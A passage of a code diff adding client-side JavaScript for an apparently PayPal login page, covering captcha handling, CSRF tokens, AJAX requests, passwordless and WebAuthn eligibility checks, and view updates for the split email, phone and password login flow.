+		$target = $(getEventTarget(event));
+
+		if ($target.hasClass('infoLink') || $target.hasClass('bubble-tooltip')) {
+			// cancel link default behavior
+			eventPreventDefault(event);
+
+			// toggle to show/hide the bubble when the link is clicked
+			$bubble.toggle();
+			return;
+		}
+
+		// any other place, hide the bubble
+		$bubble.addClass('hide');
+	}
+
+	/**
+	 * Chrome will not allow reading the password field on page load
+	 * Attempt to see if it adds the light yellow color to the field instead
+	 * Note: This is a best effort method and may not always work as expected
+	 */
+	function isChromePrefilledField(field) {
+		return !!(field && window.chrome && window.chrome.webstore
+		&& getComputedStyle(field).backgroundColor === 'rgb(250, 255, 189)');
+	}
+
+	/**
+	 * Multipurpose method to check if a field is prefilled by the browser
+	 */
+	function isFieldPrefilled(field) {
+		if (!field) {
+			return false;
+		}
+		return isChromePrefilledField(field) || (field.value && field.value.length > 0);
+	}
+
+	function isInIframe () {
+		return window.self !== window.top;
+	}
+
+	function getSplitLoginContext () {
+		var splitLoginContext = document.querySelector('input[name="splitLoginContext"]');
+		return splitLoginContext && splitLoginContext.value;
+	}
+
+	function getIntent() {
+		var intentField = document.querySelector('input[name="intent"]');
+		return (intentField && intentField.value) || '';
+	}
+
+	function getReturnUri() {
+		var returnUriField = document.querySelector('input[name="returnUri"]');
+		return (returnUriField && returnUriField.value) || '';
+	}
+
+	function getReturnUriState() {
+		var stateField = document.querySelector('input[name="state"]');
+		return (stateField && stateField.value) || '';
+	}
+
+	function getFlowId() {
+		var flowId = document.querySelector('input[name=flowId]');
+		return (flowId && flowId.value) || '';
+	}
+
+	function getSessionId() {
+		var sessionId = document.querySelector('input[name=_sessionID]');
+		return sessionId && sessionId.value;
+	}
+
+	function getKmliCb() {
+		return document.querySelector('#keepMeLoggedIn');
+	}
+
+	/**
+	 * Method to detect the Hermes app in-context merchant integration
+	 *
+	 * @returns {boolean}
+	 */
+	function isInContextIntegration() {
+		return !!window.xprops;
+	}
+
+	/**
+	 * Finds currently active Captcha component in split-login
+	 * @param {Object} splitLoginContext
+	 */
+	function getActiveCaptchaElement(splitLoginContext) {
+		var captchaElement;
+		var splitLoginCookiedFallback = document.querySelector('input[name="splitLoginCookiedFallback"]');
+
+		// non-split-login page
+		if (!splitLoginContext || splitLoginCookiedFallback) {
+			captchaElement = document.querySelector('#captcha');
+			return getCaptchaDom(captchaElement);
+		}
+
+		switch (splitLoginContext.value) {
+			case 'inputEmail':
+				captchaElement = document.querySelector(isHybridLoginExperience() ? '#splitHybridCaptcha' : '#splitEmailCaptcha');
+				break;
+			case 'inputPhone':
+				captchaElement = document.querySelector(isHybridLoginExperience() ? '#splitHybridCaptcha' : '#splitPhoneCaptcha');
+				break;
+			case 'inputPassword':
+			case 'inputPin':
+				captchaElement = document.querySelector(isHybridLoginExperience() ?
+					'#splitHybridCaptcha' : '#splitPasswordCaptcha');
+				break;
+			case 'implicitEmail':
+				captchaElement = document.querySelector('#implicitEmailCaptcha');
+				break;
+			default:
+				captchaElement = null;
+		}
+
+		// A hidden captcha element should not have any effect
+		if (captchaElement && $(captchaElement).hasClass('hide')) {
+			return null;
+		}
+		return getCaptchaDom(captchaElement);
+	}
+
+	/**
+	 * Returns the value of the query param passed in the given url
+	 */
+	function getQueryParamFromUrl(param, url) {
+		url = decodeURIComponent(url);
+		var queryStr = url && url.split('?')[1];
+		var queryObj = {};
+		if (!queryStr) {
+			return;
+		}
+		queryStr.split('&').forEach(function(keyValue) {
+			var split = keyValue.split('=');
+			queryObj[split[0]] = split[1];
+		});
+		return queryObj[param];
+	}
+
+	/**
+	 * Returns object containing query params key value
+	 * pairs passed in the given url
+	 *
+	 * @param {Sring} url
+	 */
+	function getQueryParamsObj(url) {
+		url = decodeURIComponent(url);
+		var queryStr = url && url.split('?')[1];
+		var queryObj = {};
+		var keyValues, split;
+
+		if (!queryStr) {
+			return;
+		}
+
+		keyValues = queryStr.split('&');
+		for (var i = 0; i < keyValues.length; i++) {
+			split = keyValues[i].split('=');
+			queryObj[split[0]] = split[1];
+		}
+
+		return queryObj;
+	}
+
+	/**
+	 * Updates a URL by replacing one single param value
+	 *
+	 * @param {String} url
+	 * @param {String} prop
+	 * @param {String} newVal
+	 */
+	function updateParamValue(url, prop, newVal) {
+		var paramsObj = login.utils.getQueryParamsObj(url);
+		var val, href;
+
+		// No query params in url
+		if (!paramsObj) {
+			return url[url.length - 1] === '?' ?
+				url + prop + '=' + newVal :
+				url + '?' + prop + '=' + newVal;
+		}
+
+		// prop has a value (ulPage=xyz OR ulPage=)
+		if (paramsObj[prop] !== undefined) {
+			val = paramsObj[prop];
+			return url.replace(prop + '=' + val, prop + '=' + newVal);
+		}
+
+		// prop is not defined in the URL
+		return url + '&' + prop + '=' + newVal;
+	}
+
+	function getCaptchaDom(wrapperElement) {
+		if (!wrapperElement) {
+			return null;
+		}
+
+		return {
+			container: wrapperElement.querySelector('div.textInput'),
+			field: wrapperElement.querySelector('input[type=text]'),
+			errMsgContainer: wrapperElement.querySelector('div.errorMessage'),
+			errMsg: wrapperElement.querySelector('div.errorMessage .emptyError'),
+			playAudioBtn: wrapperElement.querySelector('.captchaPlay'),
+			refreshCaptchaBtn: wrapperElement.querySelector('.captchaRefresh'),
+			audioTag: wrapperElement.querySelector('.audio audio'),
+			image: wrapperElement.querySelector('.captcha-image img'),
+			audioLink: wrapperElement.querySelector('.audio a')
+		};
+	}
+
+	function setSliderToPasswordContainer() {
+		var splitPasswordDiv = document.querySelector('#splitPassword');
+		if (splitPasswordDiv) {
+			$(splitPasswordDiv).addClass('transformRightToLeft');
+		}
+	}
+
+	function addHiddenElement(name, value, target) {
+		var input = document.createElement('input');
+		if (!target) {
+			return;
+		}
+		input.setAttribute('type', 'hidden');
+		input.setAttribute('name', name);
+		input.setAttribute('value', value);
+		target.appendChild(input);
+	}
+
+	/**
+	 * Add a hidden element only if it does not exist
+	 * @param {string} name
+	 * @param {string} value
+	 * @param {Element} target
+	 */
+	function addHiddenElementIfNotExist(name, value, target) {
+		var check = target && target.querySelector('input[name="' + name  + '"]');
+		if (check) {
+			return;
+		}
+		addHiddenElement(name, value, target);
+	}
+
+	function doImpressionTracking(response) {
+		try {
+			PAYPAL.analytics.instance.recordImpression({data: response.sys.tracking.fpti.dataString});
+		} catch (e) {}
+	}
+
+	function createIframe(attributes) {
+		var iframeElement = document.createElement('iframe');
+		var iframeAttributes = ['id', 'className', 'frameBorder', 'sandbox', 'src', 'style'];
+		if (!attributes) {
+			return;
+		}
+		for (var i = 0 ; i < iframeAttributes.length ; i++) {
+			if (attributes[iframeAttributes[i]]) {
+				iframeElement[iframeAttributes[i]] = attributes[iframeAttributes[i]];
+			}
+		}
+		document.body.appendChild(iframeElement);
+		return iframeElement;
+	}
+
+	function postPpBridgeMessage(msg) {
+		var opener = window.opener;
+		try {
+			// Todo: Need to check with Helios team with the correct behavior for this,
+			// Would ebay timeout if they dont receive post messages or if the redirection happens in MB
+			// then checkout script would take care of it.
+			msg = typeof msg === 'string' ? msg : JSON.stringify(msg);
+			// If we are not in IE, attempt to send a postMessage
+			if (opener && (window.navigator.userAgent.match(/edge/i) ||
+				(opener.postMessage && !window.navigator.userAgent.match(/msie|trident/i)))) {
+				opener.postMessage(msg, '*');
+				return true;
+			}
+			// Otherwise, attempt to send a message through the iframe bridge
+			var bridge = opener && opener.frames && opener.frames.length && opener.frames.PayPalBridge;
+
+			if (bridge && bridge.returnToParent) {
+				bridge.returnToParent(msg);
+				return true;
+			}
+		} catch (err) {
+			return false;
+		}
+
+		return false;
+	}
+
+	function isPpFrameMiniBrowser() {
+		return window.opener && window.name && window.name.indexOf('PPFrame') === 0;
+	}
+
+	function updatePageLevelError(msg, msgTyp) {
+		var notificationContainer = document.querySelector('.notifications');
+		var paraEle, notificationMsg;
+
+		if (notificationContainer) {
+			paraEle = document.createElement('p');
+			notificationMsg = document.createTextNode(msg);
+
+			paraEle.setAttribute('class', 'notification ' + msgTyp);
+			paraEle.setAttribute('role', 'alert');
+
+			paraEle.appendChild(notificationMsg);
+			notificationContainer.appendChild(paraEle);
+		}
+	}
+
+	function getCSRFToken() {
+		var tokenDOM = document.getElementById('token');
+		return (tokenDOM && tokenDOM.value) || '';
+	}
+
+	function setCSRFToken(token) {
+		var tokenDOM = document.getElementById('token');
+		if (tokenDOM && token) {
+			tokenDOM.value = token;
+		}
+	}
+
+	function makeServerRequestAndReturnPromise(url, options) {
+		return new Promise(function(resolve, reject) {
+			var data = {};
+
+			options = options || {};
+			if (options.data) {
+				data = options.data;
+			}
+			// Set the CSRF token
+			data['_csrf'] = getCSRFToken();
+
+			// Show spinner default to all XHR calls
+			showSpinner();
+
+			$.ajax({
+				type: options.method || 'POST',
+				url: url,
+				data: data,
+				dataType: 'json',
+				success: function(response) {
+					if (response) {
+						setCSRFToken(response['_csrf']);
+						return resolve(response);
+					} else {
+						return reject();
+					}
+				},
+				fail: function(err) {
+					return reject();
+				}
+			});
+		});
+	}
+
+	function isAndroidDevice() {
+		return window.navigator.vendor === 'Google Inc.' &&
+			navigator.userAgent.match(/Android/i)
+	}
+
+	/**
+	 * Checks if a value looks like email and not like a phone.
+	 * @param {String} value
+	 * @return {Boolean}
+	 */
+	function doesItLookLikeEmail(value) {
+		if (!value) { // It's true for empty values.
+			return true;
+		}
+
+		// Remove all special phone chars: -().+ and a space. All of those are used in the NATIONAL phone format below:
+		// https://engineering.paypalcorp.com/i18napp/#phone
+		value = value.replace(/[-()\.\+\s]/ig, '');
+
+		// If there is no string left after removing special phone characters or
+		// if there is any non-digit character after removing phone specific characters, then it looks like email.
+		return !value || value.search(/\D+/g) >= 0;
+	}
+
+	function isPrefillEmailEnabled() {
+		return $('body').data('isPrefillEmailEnabled') === 'true';
+	}
+
+	function hidePasswordForPrefillHybrid() {
+		var splitPasswordSection = document.querySelector('#splitPassword');
+		splitPasswordSection && $(splitPasswordSection).addClass('hide');
+	}
+
+	function isPrefilledEmailNext() {
+		var prefillEmailHybrid = document.querySelector('input[name=isPrefillEmailEnabled]');
+		return prefillEmailHybrid && prefillEmailHybrid.value === 'true';
+	}
+
+	function renderPasswordFromPrefillHybridView() {
+		var profileRememberedEmail = document.querySelector('.profileRememberedEmail');
+		profileRememberedEmail && $(profileRememberedEmail).removeClass('cookiedProfile');
+		setSliderToPasswordContainer();
+		updateView({
+			splitLoginContext: 'inputPassword',
+			profile: {
+				email: email && email.value
+			},
+			verification: null,
+			notifications: null
+		});
+	}
+
+	function isTpdDemo() {
+		return $('body').data('tpdDemo') === 'true';
+	}
+
+	function getCtxId() {
+		var ctxId = document.querySelector('input[name=ctxId]');
+		return (ctxId && ctxId.value) || '';
+	}
+
+	/**
+	 * Function to check if session is eligible for pwdless priority experience
+	 * @param {Object} model
+	 * @returns {boolean}
+	 */
+	function isPwdlessPriorityEnabled(model) {
+		if (model) {
+			return model.isPwdlessPriorityEnabled;
+		}
+		return !!($('body').data('isPwdlessPriorityEnabled'));
+	}
+
+	/**
+	 * Function to check if One Touch User
+	 * @returns {boolean}
+	 */
+	function isOTEligible() {
+		var isOneTouchUser = !!(login.oneTouchLogin && $('body').data('oneTouchUser'));
+		if (isOneTouchUser) {
+			login.logger.log({
+				evt: 'PWDLESS_PRIORITY_CLIENT',
+				data: 'ONETOUCH_PRIORITY',
+				calEvent: true
+			});
+			login.logger.pushLogs();
+		}
+		return isOneTouchUser;
+	}
+
+	/**
+	 * Function to check if session is aPay eligible
+	 * @param {Object} model
+	 * @returns {boolean}
+	 */
+	function isAPayEnabled(model) {
+		var ulData = (model && model.contextualLogin) || (window.PAYPAL && window.PAYPAL.ulData) || {};
+		var isPwdlessPriorityFeatureEnabled = isPwdlessPriorityEnabled(model);
+		var isAPayEligible = isPwdlessPriorityFeatureEnabled && ulData.aPayAuth;
+
+		// Android Pay is not eligible if Hard Decline OR if not within pwdLessPriority feature
+		if (ulData.canNotMakePayment || !isPwdlessPriorityFeatureEnabled) {
+			return false;
+		}
+		if (isAPayEligible) {
+			login.logger.log({
+				evt: 'PWDLESS_PRIORITY_CLIENT',
+				data: 'APAY_PRIORITY',
+				calEvent: true
+			});
+
+			login.logger.pushLogs();
+		}
+		return isAPayEligible;
+	}
+
+	/**
+	 * Function to check if session is GSL Activation eligible
+	 * @param {Object} model
+	 * @returns {boolean}
+	 */
+	function isSLActivation(model) {
+		var slAction = (model && model.slAction) ||
+			window.PAYPAL && window.PAYPAL.slData && window.PAYPAL.slData.slAction;
+
+		if (slAction === 'activation' && login.smartLock) {
+			login.logger.log({
+				evt: 'PWDLESS_PRIORITY_CLIENT',
+				data: 'SL_PRIORITY',
+				calEvent: true
+			});
+
+			login.logger.pushLogs();
+			return true;
+		}
+		return false;
+	}
+
+	/**
+	 * Function to check if session is eligible for WebAuthn Login
+	 * @returns {boolean}
+	 */
+	function isWebAuthnEligible() {
+		var isWebAuthnEligible = !!(login.webAuthnLogin && $('body').data('webAuthnLoginContext'));
+		if (isWebAuthnEligible) {
+			login.logger.log({
+				evt: 'PWDLESS_PRIORITY_CLIENT',
+				data: 'WEB_AUTHN_PRIORITY',
+				calEvent: true
+			});
+
+			login.logger.pushLogs();
+		}
+		return isWebAuthnEligible;
+	}
+
+	/**
+	 * Add an event handler to a DOM that will be invoked when autofill happens
+	 * Verified to work as expected on Webkit browsers Chrome and Safari
+	 * @param {Element} dom
+	 */
+	function addAutofillEventHandler(dom, handler) {
+		if (!dom || !handler || typeof handler !== 'function') {
+			return;
+		}
+
+		addEvent(dom, 'input', function onInput(e) {
+			eventPreventDefault(e);
+			var inputType = e.inputType;
+			var data = e.data;
+
+			if (inputType === 'insertText' || inputType === 'deleteContentBackward' || inputType === 'insertFromPaste') {
+				return true;
+			}
+
+			if (!data) {
+				return handler(e);
+			}
+		});
+	}
+
+	/**
+	 * function to safely parse string into JSON.
+	 * @param {String} jsonData
+	 */
+	function parseJsonSafe(jsonData) {
+		var parsedData;
+		try {
+			parsedData = JSON.parse(jsonData);
+			return parsedData;
+		} catch (e) {
+			return {};
+		}
+	}
+
+	/**
+	 * function to determine if the given browser is in private mode,
+	 * only supported for Safari and Chrome at the moment.
+	 * @param {function} callback will return an object containing isPrivate property, true if private mode,
+	 * false otherwise.
+	 */
+	function isBrowserInPrivateMode(callback) {
+		if (window.webkitRequestFileSystem) {
+			window.webkitRequestFileSystem(
+				window.TEMPORARY, 1,
+				function() {
+					callback({isPrivate: false});
+				},
+				function() {
+					callback({isPrivate: true});
+				}
+			);
+		} else if (/Safari/.test(window.navigator.userAgent)) {
+			try {
+				if (!window.localStorage) {
+					callback({isPrivate: true});
+				}
+				window.openDatabase(null, null, null, null);
+				window.localStorage.setItem('test', 1);
+
+				if (window.localStorage.getItem('test') === '1') {
+					window.localStorage.removeItem('test');
+					callback({isPrivate: false});
+				}
+			} catch(e) {
+				callback({isPrivate: true});
+			}
+
+		} else {
+			callback({isPrivate: false});
+		}
+	}
+
+	function isFnDataLoaded() {
+		var fnSyncData = document.querySelector('input[name="fn_sync_data"]');
+		return fnSyncData && fnSyncData.value;
+	}
+
+	return {
+		showSpinner: showSpinner,
+		hideSpinner: hideSpinner,
+		showSpinnerMessage: showSpinnerMessage,
+		hideSpinnerMessage: hideSpinnerMessage,
+		getOutboundLinksHandler: getOutboundLinksHandler,
+		isFieldPrefilled: isFieldPrefilled,
+		notYouClickHandler: notYouClickHandler,
+		successfulXhrHandler: successfulXhrHandler,
+		failedXhrSubmitHandler: failedXhrSubmitHandler,
+		documentClickHandler: documentClickHandler,
+		toggleRememberInfoTooltip: toggleRememberInfoTooltip,
+		updateView: updateView,
+		isInIframe: isInIframe,
+		isInContextIntegration: isInContextIntegration,
+		getSplitLoginContext: getSplitLoginContext,
+		getIntent: getIntent,
+		getReturnUri: getReturnUri,
+		getReturnUriState: getReturnUriState,
+		getFlowId: getFlowId,
+		getSessionId: getSessionId,
+		getKmliCb: getKmliCb,
+		getActiveCaptchaElement: getActiveCaptchaElement,
+		getCaptchaDom: getCaptchaDom,
+		getQueryParamFromUrl: getQueryParamFromUrl,
+		setSliderToPasswordContainer: setSliderToPasswordContainer,
+		getQueryParamsObj: getQueryParamsObj,
+		updateParamValue: updateParamValue,
+		addHiddenElement: addHiddenElement,
+		addHiddenElementIfNotExist: addHiddenElementIfNotExist,
+		doImpressionTracking: doImpressionTracking,
+		createIframe: createIframe,
+		postPpBridgeMessage: postPpBridgeMessage,
+		isPpFrameMiniBrowser: isPpFrameMiniBrowser,
+		updatePageLevelError: updatePageLevelError,
+		makeServerRequestAndReturnPromise: makeServerRequestAndReturnPromise,
+		getCSRFToken: getCSRFToken,
+		setCSRFToken: setCSRFToken,
+		isAndroidDevice: isAndroidDevice,
+		doesItLookLikeEmail: doesItLookLikeEmail,
+		isHybridLoginExperience: isHybridLoginExperience,
+		isHybridEditableOnCookied: isHybridEditableOnCookied,
+		isPrefillEmailEnabled: isPrefillEmailEnabled,
+		hidePasswordForPrefillHybrid: hidePasswordForPrefillHybrid,
+		isPrefilledEmailNext: isPrefilledEmailNext,
+		renderPasswordFromPrefillHybridView: renderPasswordFromPrefillHybridView,
+		isTpdDemo: isTpdDemo,
+		getCtxId: getCtxId,
+		isPwdlessPriorityEnabled: isPwdlessPriorityEnabled,
+		isOTEligible: isOTEligible,
+		isAPayEnabled: isAPayEnabled,
+		isSLActivation: isSLActivation,
+		isWebAuthnEligible: isWebAuthnEligible,
+		addAutofillEventHandler: addAutofillEventHandler,
+		parseJsonSafe: parseJsonSafe,
+		isBrowserInPrivateMode: isBrowserInPrivateMode,
+		isFnDataLoaded: isFnDataLoaded
+	};
+}());
+
+
+(function() {
+	/**
+	 * Custom library which supports DOM manipulation
+	 * @param {Object} element The DOM object
+	 */
+	var _DOM = function(element) {
+		if (typeof element === 'string') {
+			element = document.querySelector(element);
+		}
+
+		if (!element) {
+			return;
+		}
+
+		/**
+		 * Check if the element contains specified class
+		 * @param {String} className To check the class name
+		 * @returns {boolean}
+		 */
+		function hasClass(className) {
+			if (element.classList) {
+				return element.classList.contains(className);
+			} else {
+				return !!element.className.match(new RegExp('(\\s|^)' + className + '(\\s|$)'));
+			}
+		}
+
+		/**
+		 * Add class to the element
+		 * @param {String} className Add to the specified element
+		 */
+		function addClass(className) {
+			if (element.classList) {
+				element.classList.add(className);
+			} else if (!hasClass(className)) {
+				element.className += ' ' + className;
+			}
+		}
+
+		/**
+		 * Remove class from the element
+		 * @param {String} className Remove from the specified element
+		 */
+		function removeClass(className) {
+			if (element.classList) {
+				element.classList.remove(className);
+			} else if (hasClass(className)) {
+				var reg = new RegExp('(\\s|^)' + className + '(\\s|$)');
+				element.className = element.className.replace(reg, ' ')
+			}
+		}
+
+		/**
+		 * Access (or set) data attribute on an element
+		 * @param {String} attr Camel cased data attribute name
+		 */
+		function data(attr, value) {
+			var decamelizedAttr;
+			if (typeof attr !== 'string') {
+				return;
+			}
+			decamelizedAttr = 'data-' + attr.replace(/([A-Z])/g, '-$1').toLowerCase();
+
+			if (value) {
+				element.setAttribute(decamelizedAttr, value);
+			} else {
+				return element.getAttribute(decamelizedAttr);
+			}
+		}
+
+		/**
+		 * Return the outer height of an element
+		 * Add top and bottom margins in case of IE9+
+		 */
+		function outerHeight() {
+			var style, height = element.offsetHeight;
+			if (typeof getComputedStyle === 'undefined') {
+				return height;
+			}
+
+			style = getComputedStyle(element);
+			height += parseInt(style.marginTop) + parseInt(style.marginBottom);
+
+			return height;
+		}
+
+		/**
+		 * Get and set attribute for an element
+		 * @param {Object} attribute
+		 * @param {Object} value
+		 */
+		function attr(attribute, value) {
+			if (!value) {
+				return element.getAttribute(attribute);
+			} else {
+				return element.setAttribute(attribute, value);
+			}
+		}
+
+		/**
+		 * Find elements with the defined selector under the element
+		 * @param {Object} field
+		 */
+		function find(field) {
+			return element.querySelectorAll(field);
+		}
+
+		/**
+		 * Set or get text from an element.
+		 */
+		function text(str) {
+			var isElementTextContentAvailable = element.textContent !== undefined && element.textContent !== null;
+			if (str === undefined) {
+				return isElementTextContentAvailable ? element.textContent : element.innerText;
+			}
+			if (isElementTextContentAvailable) {
+				element.textContent = str;
+			} else {
+				element.innerText = str;
+			}
+		}
+
+		/**
+		 * Remove an element from the DOM
+		 */
+		function remove() {
+			element.parentNode.removeChild(element);
+		}
+
+		/**
+		 * Toggle show/hide by adding or removing .hide css class
+		 */
+		function toggle() {
+			if (hasClass('hide')) {
+				removeClass('hide');
+			} else {
+				addClass('hide');
+			}
+		}
+
+		function append(childEle) {
+			element.appendChild(childEle);
+		}
+
+		function focus() {
+			element.focus();
+		}
+
+		function val(inputValue) {
+			element.value = inputValue;
+		}
+
+		return {
+			hasClass: hasClass,
+			addClass: addClass,
+			removeClass: removeClass,
+			data: data,
+			outerHeight: outerHeight,
+			text: text,
+			attr: attr,
+			find: find,
+			remove: remove,
+			toggle: toggle,
+			append: append,
+			focus: focus,
+			val: val
+		};
+	};
+
+	/**
+	 * Generic ajax request
+	 * @param {Object} options Object to state the URL, POST data, callbacks etc
+	 */
+	_DOM.ajax = function(options) {
+		var xhr, response, hdr, serializedData = [], prop;
+		if (!options || options && !options.url) {
+			return;
+		}
+
+		try {
+			xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
+		} catch (e) {
+			// TODO: Track this browser that doesnt let us do XHR
+		}
+
+		if (!xhr) {
+			return;
+		}
+
+		options.method = options.method || 'POST';
+
+		if (options.data && typeof options.data !== 'string') {
+			for (prop in options.data) {
+				serializedData.push(encodeURIComponent(prop) + '=' + encodeURIComponent(options.data[prop]));
+			}
+		}
+
+		xhr.onreadystatechange = function() {
+			if (xhr.readyState !== 4) {
+				return;
+			}
+
+			response = xhr.response || xhr.responseText;
+			if (xhr.status === 200 && response) {
+				// Since (here) status is 200, the response is either JSON or plain text (or html string)
+				try {
+					response = JSON.parse(response);
+				} catch (e) {
+					// No need to do anything (in most cases this means non JSON response)
+				}
+
+				typeof options.success === 'function' && options.success(response);
+			}
+			if (xhr.status !== 200 && typeof options.fail === 'function') {
+				options.fail(xhr); // xhr.status is 0 by default
+			}
+
+			typeof options.complete === 'function' && options.complete();
+		};
+
+		xhr.open(options.method, options.url);
+		xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+		if (options.method === 'POST') {
+			xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+			xhr.setRequestHeader('Accept', 'application/json');
+		}
+
+		if (options.method === 'GET') {
+			xhr.setRequestHeader('Accept', 'application/json');
+		}
+
+		if (typeof options.headers === 'object' && options.headers.length) {
+			for (hdr in options.headers) {
+				xhr.setRequestHeader(hdr, options.headers[hdr]);
+			}
+		}
+
+		xhr.send(serializedData && serializedData.join('&'));
+		return xhr;
+	};
+	window.$ = _DOM;
+})();
+
+// VIEW
+login.view = (function() {
+	function render(state) {
+		var splitLoginContext = document.querySelector('input[name=splitLoginContext]');
+		var model = (state && state.model) || {};
+		if (typeof window.showGdprBanner === 'function') {
+			window.showGdprBanner();
+		}
+		splitLoginContext.value = model.splitLoginContext;
+		updateViewAfterAds(model);
+		updateNotificationView(model);
+		updateEmailView(model);
+		updatePinView(model);
+		updatePasswordView(model);
+		updateProfileView(model);
+		updateSignupView(model);
+		updateCaptchaDom(model);
+		updateVerificationView(model);
+		updateSubHeaderView(model);
+		updateHybridLoginView(model);
+		if (login.verification) {
+			login.verification.updateView(model);
+		}
+		updateWebAuthnView(model);
+	}
+
+	function updateWebAuthnView(model) {
+		var pwFpIcon = document.querySelector('#pwFpIcon');
+		var fieldWrapperPassword = document.querySelector('#password').parentElement;
+		var textInputPassword = fieldWrapperPassword.parentElement;
+		var webAuthnFpIconEnabled = model.webAuthnFpIconEnabled;
+		if (!$('body').data('isUvpaaExist') && $('body').data('isWebAuthnHigherVersionEligible') && model.webAuthnLoginContext) {
+			return;
+		}
+		if (model.webAuthnLoginContext && login.webAuthnLogin) {
+			login.webAuthnLogin(model);
+			if (!webAuthnFpIconEnabled) {
+				return;
+			}
+			document.body.setAttribute('data-web-authn-login-context', model.webAuthnLoginContext);
+			if (model.wanSupportLookup) {
+				document.body.setAttribute('data-web-authn-support-lookup', 'true');
+			}
+			pwFpIcon && $(pwFpIcon).removeClass('hide');
+			textInputPassword && $(textInputPassword).addClass('errorMessageFp');
+			if (model.isRtl) {
+				fieldWrapperPassword && $(fieldWrapperPassword).addClass('rtlFpPlaceholder');
+			} else {
+				fieldWrapperPassword && $(fieldWrapperPassword).removeClass('rtlFpPlaceholder');
+			}
+		} else if (pwFpIcon && !$(pwFpIcon).hasClass('hide')) {
+			pwFpIcon && $(pwFpIcon).addClass('hide');
+			textInputPassword && $(textInputPassword).removeClass('errorMessageFp');
+			fieldWrapperPassword && $(fieldWrapperPassword).removeClass('rtlFpPlaceholder');
+		}
+	}
+
+	function updateHybridLoginView(model) {
+		var emailField = document.querySelector('#email');
+		var emailLabel = document.querySelector('label[for="email"]');
+		var phoneField = document.querySelector('#phone');
+		var countryPhoneSelectWrapper = document.querySelector('.countryPhoneSelectWrapper');
+		var emailContainer = document.querySelector('#login_emaildiv');
+		var profileRememberedEmail = document.querySelector('.profileRememberedEmail');
+
+		// Enable fields for email and phone when a user goes back to the first page, so they can be used.
+		if (!model.profile) {
+			emailField && emailField.removeAttribute('disabled');
+			phoneField && phoneField.removeAttribute('disabled');
+		}
+
+		// Switch to the email login experience by hiding phone specific DOM.
+		countryPhoneSelectWrapper && $(countryPhoneSelectWrapper).addClass('hide');
+		emailContainer && $(emailContainer).removeClass('phoneInputWrapper');
+
+		// Remove cookied profile CSS when there is no profile to prefill.
+		if (!model.profile && profileRememberedEmail) {
+			$(profileRememberedEmail).removeClass('cookiedProfile');
+		}
+
+		// Clean up a field that wasn't used on the hybrid login page.
+		if (!model.phone && phoneField) {
+			phoneField.value = null;
+		} else if (model.phone && emailField) {
+			emailField.value = null;
+		}
+
+		// Phone hybrid login failed, so enforce email only hybrid login on 8ball.
+		if (model.notifications && model.hybridInEmailOnlyMode && model.contextualLogin && model.contextualLogin.content) {
+			emailField && $(emailField).attr('placeholder', model.contextualLogin.content.emailLabel);
+			if (emailLabel) {
+				$(emailLabel).text(model.contextualLogin.content.emailLabel);
+			}
+			emailField && $(emailField).attr('data-hybrid-in-email-only-mode', model.hybridInEmailOnlyMode);
+		}
+	}
+
+	function updateEmailView(model) {
+		var splitEmailAndPhoneDom = document.querySelector('#splitEmail'); // #splitEmail contains the email & phone fields
+		var splitEmailSection = document.querySelector('#splitEmailSection');
+		var splitPhoneSection = document.querySelector('#splitPhoneSection');
+		var rememberProfileDom = document.querySelector('#rememberProfileEmail');
+		var email = document.querySelector('#email');
+		var phone = document.querySelector('#phone');
+		var pwrButton = document.querySelector('.forgotLink');
+		var pwrBubble = document.querySelector('.forgotLink .bubble-tooltip');
+		var btnActions = document.querySelector('.actions');
+		var switchToPhoneDiv = document.querySelector('#loginWithPhoneOption');
+		var switchToEmailDiv = document.querySelector('#loginWithEmailOption');
+		var phonePasswordEnabled = $('body').data('phonePasswordEnabled');
+		var phonePinEnabled = $('body').data('phonePinEnabled');
+
+		if (model.splitLoginContext === 'inputEmail' || model.splitLoginContext === 'inputPhone') {
+			splitEmailAndPhoneDom && $(splitEmailAndPhoneDom).removeClass('hide');
+			if (rememberProfileDom && typeof model.rememberProfile !== 'undefined') {
+				rememberProfileDom.checked = model.rememberProfile === 'true' || model.rememberProfile === true;
+			}
+			instrumentFirstSplitPageRendered();
+		} else {
+			// Do not change views behind spinner when auto-triggering PN
+			if (model.tpdVariant !== 'autoSend') {
+				splitEmailAndPhoneDom && $(splitEmailAndPhoneDom).addClass('hide');
+			}
+			phone && phone.blur();
+			email && email.blur();
+		}
+
+		if (splitEmailSection && model.splitLoginContext === 'inputEmail') {
+			$(splitEmailSection).removeClass('hide');
+			email.removeAttribute('disabled');
+			if (phonePinEnabled || phonePasswordEnabled) {
+				switchToPhoneDiv && $(switchToPhoneDiv).removeClass('hide');
+				switchToEmailDiv && $(switchToEmailDiv).addClass('hide');
+				pwrButton && $(pwrButton).addClass('hide');
+				pwrBubble && $(pwrBubble).addClass('hide');
+			} else if (model.hidePwrOnEmailPage) {
+				pwrButton && $(pwrButton).addClass('hide');
+				pwrBubble && $(pwrBubble).addClass('hide');
+			} else {
+				pwrButton && $(pwrButton).removeClass('hide');
+			}
+			$(btnActions).removeClass('phonePresent');
+			// Disable phone
+			if (splitPhoneSection) {
+				$(splitPhoneSection).addClass('hide');
+			}
+			if (phone) {
+				phone.value = '';
+				phone.setAttribute('disabled', 'disabled');
+			}
+		}
+
+		if (splitPhoneSection && model.splitLoginContext === 'inputPhone') {
+			splitEmailSection && $(splitEmailSection).addClass('hide');
+			$(splitPhoneSection).removeClass('hide');
+			if (phonePinEnabled || phonePasswordEnabled) {
+				switchToPhoneDiv && $(switchToPhoneDiv).addClass('hide');
+				switchToEmailDiv && $(switchToEmailDiv).removeClass('hide');
+			}
+		}
+	}
+
+	function setSmartLockView(model) {
+		// Early return if smartlock is not enabled
+		if (!model.enableSmartlock) {
+			return;
+		}
+		// Call smartLock handler
+		login.smartLock(model);
+	}
+
+	function updatePinView(model) {
+		var retiringPhonePinMessage = document.querySelector('.educationMessage');
+		if (model.showEducationMessage === true && model.splitLoginContext === 'inputPin') {
+			retiringPhonePinMessage && $(retiringPhonePinMessage).removeClass('hide');
+		} else {
+			retiringPhonePinMessage && $(retiringPhonePinMessage).addClass('hide');
+		}
+	}
+
+	function updatePasswordView(model) {
+		var splitPasswordAndPinDom = document.querySelector('#splitPassword');
+		var splitPasswordSection = document.querySelector('#splitPasswordSection');
+		var splitPinSection = document.querySelector('#splitPinSection');
+		var passwordField = document.querySelector('#password');
+		var pinField = document.querySelector('#pin');
